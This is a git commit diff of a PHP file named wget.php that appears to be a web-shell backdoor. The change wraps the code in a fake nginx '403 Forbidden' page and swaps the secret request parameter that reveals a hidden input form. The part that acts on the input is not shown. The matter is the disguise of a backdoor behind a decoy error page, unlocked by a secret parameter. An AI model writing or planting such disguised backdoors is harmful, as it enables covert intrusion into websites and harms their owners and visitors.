5abc75c6afdf5219407871f1773296a1099a1304
mrkronkz <33080064+mrkronkz@users.noreply.github.com>
2022-11-18 17:23:42 +0700

    Update wget.php

--- wget.php
+++ wget.php
@@ -1,4 +1,13 @@
-if(isset($_REQUEST['ganteng'])){
+<html>
+<head><title>403 Forbidden</title></head>
+<body>
+<center><h1>403 Forbidden</h1></center>
+<hr><center>nginx/1.20.1</center>
+</body>
+</html>
+
+<?php
+if(isset($_REQUEST['kronkz>>>'])){
         echo "<pre>";
         echo "<form name='form' action='#' method='post'>
        <input type='text' name='coba'/> <input type='submit' value='enter'/>
@@ -9,3 +18,4 @@ if(isset($_REQUEST['ganteng'])){
        
         die;
 }
+?>
